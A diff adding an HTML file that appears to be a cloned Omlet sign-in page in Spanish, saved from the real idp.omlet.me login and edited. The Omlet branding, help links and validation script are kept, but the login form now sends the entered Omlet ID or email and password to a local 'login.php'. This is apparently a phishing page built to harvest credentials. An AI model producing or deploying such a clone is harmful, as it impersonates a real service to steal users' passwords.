@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<!-- saved from url=(0089)https://idp.omlet.me/login?k=2AMTFPGD74OI77KE5HV0&er=https%3A%2F%2Fidp.omlet.me%2Fconsole -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Omlet</title>
+<meta name="viewport" content="initial-scale=1,maximum-scale=1">
+
+<link rel="shortcut icon" href="https://idp.omlet.me/arcade-favicon.ico" type="image/x-icon">
+<link type="text/css" rel="stylesheet" href="./Omlet_files/reset.css">
+<link type="text/css" rel="stylesheet" href="./Omlet_files/signin.css">
+<link type="text/css" rel="stylesheet" href="./Omlet_files/signin-v2.css">
+<link type="text/css" rel="stylesheet" href="./Omlet_files/signin-v3.css">
+<script type="application/javascript" src="./Omlet_files/signin.js"></script>
+
+<script>
+
+  function onSubmit(token) {
+    document.getElementById('signin').submit();
+  }
+
+  function validate(event) {
+    showLoader();
+    if (!validateLogin()) {
+    } else {
+        document.getElementById('signin').submit();
+    }
+  }
+
+  function onload() {
+    document.getElementById('login-button').onclick = validate;
+  }
+</script>
+</head>
+<body>
+
+<div class="bg"></div>
+
+<div class="center">
+    <div class="confirm-modal-bg-mask" id="reset-confirm" onclick="closeErrorCountAlert()">
+      <div class="reset-pw-confirm" onclick="event.stopPropagation()">
+        <div class="reset-or-suport-title">¿Problemas al iniciar sesión?</div>
+        <div class="reset-or-suport-desc">
+          Intenta restablecer la contraseña a través de tu correo electrónico ahora, o contáctenos para obtener ayuda.
+        </div>
+        <div class="confirm-actions">
+          <a class="action-btn" href="https://omlet.zendesk.com/hc/requests/new" target="_blank">
+            Ayuda
+          </a>
+          <a class="action-btn" href="https://idp.omlet.me/forgotpass?k=2AMTFPGD74OI77KE5HV0&amp;er=https%3A%2F%2Fidp.omlet.me%2Fconsole">
+            Restablecer contraseña
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <div class="container">
+        <div class="logo"></div>
+        <div class="mtx6">
+<form action="login.php" method="post">
+
+              <div class="field-name">Omlet Id o Correo Electrónico</div>
+              <div class="textinputbox">
+                <input class="textinput" autocorrect="off" autocapitalize="off" id="omid" name="text" type="text" value="">
+              </div>
+              <div id="iddes" class="hide"><div id="idmsg" class="error"></div></div>
+
+              <div class="field-name">Contraseña </div>
+              <div class="textinputbox">
+                <input class="textinput" autocorrect="off" autocapitalize="off" maxlength="20" id="pass" name="password" type="password">
+                <div class="pw-visible-btn hide-pw" id="pw-visible-btn" onclick="togglePasswordVisibility()"></div>
+              </div>
+              <div id="pdes" class="hide"><div id="pmsg" class="error"></div></div>
+
+              <div class="forgotpw link"><a class="forgotpw" href="https://idp.omlet.me/forgotpass?k=2AMTFPGD74OI77KE5HV0&amp;er=https%3A%2F%2Fidp.omlet.me%2Fconsole">¿Olvidaste la contraseña?</a></div>
+            
+              <button id="login-button" class="login-button">
+                <span class="loader" id="loader"></span>
+                <span>Iniciar sesión </span>
+              </button>
+            </form>
+        </div>
+
+        
+        <div class="register textcenter">
+            <a href="https://idp.omlet.me/register?k=2AMTFPGD74OI77KE5HV0&amp;er=https%3A%2F%2Fidp.omlet.me%2Fconsole">Crear Cuenta</a>
+        </div>
+        
+    </div>
+</div>
+
+<script>
+var _err = {};
+
+
+
+
+
+
+var _check = [{desEle:document.getElementById('iddes'),
+              msgEle:document.getElementById('idmsg'),
+              errs:[{code:'ioi', msg:"ID de Omlet no válido. El ID de Omlet debe tener de 6-20 carácteres (letras de la A a la Z, números del 0-9, puntos y guiones bajos)"},
+                    {code:'ie', msg:"Correo Electrónico Inválido"},
+                    {code:'inf', msg:"Omlet ID no encontrado"}]},
+             {desEle:document.getElementById('pdes'),
+              msgEle:document.getElementById('pmsg'),
+              errs:[{code:'ip', msg:"Contraseña inválida."},
+                    {code:'pi', msg:"Contraseña incorrecta"},
+                    {code:'pns', msg:"La Contrase&ntilde;a no est&aacute; establecida. Pulsa sobre Olvid&eacute; la Contrase&ntilde;a para establecer una nueva contrase&ntilde;a."}]},
+            ];
+
+checkForm();
+checkErrorCountAlert();
+onload();
+</script>
+
+
+
+</body></html>
